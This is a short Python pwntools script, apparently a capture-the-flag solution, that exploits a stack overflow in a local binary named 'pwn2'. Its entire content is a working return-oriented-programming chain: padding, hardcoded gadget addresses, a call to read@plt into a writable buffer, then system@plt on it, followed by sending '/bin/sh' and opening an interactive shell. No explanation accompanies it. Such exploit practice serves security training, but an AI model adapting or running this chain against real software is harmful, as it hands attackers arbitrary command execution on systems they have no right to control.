from pwn import *

r = process("./pwn2")
elf = ELF('./pwn2')
context(arch='amd64')

offset = 'a'*16
pop_rsi_r15_ret = 0x4006d1
pop_rdi_ret = 0x4006d3

buf = 0x601100
print 'read@plt', hex(elf.plt['read'])
print 'system@plt', hex(elf.plt['system'])
payload = flat([
                offset,
                pop_rdi_ret,
                0,
                pop_rsi_r15_ret,
                buf,
                'a' * 8,
                elf.plt['read'],
                pop_rdi_ret,
                buf,
                elf.plt['system']
                ])
r.sendline(payload)
r.sendline("/bin/sh")
r.interactive()
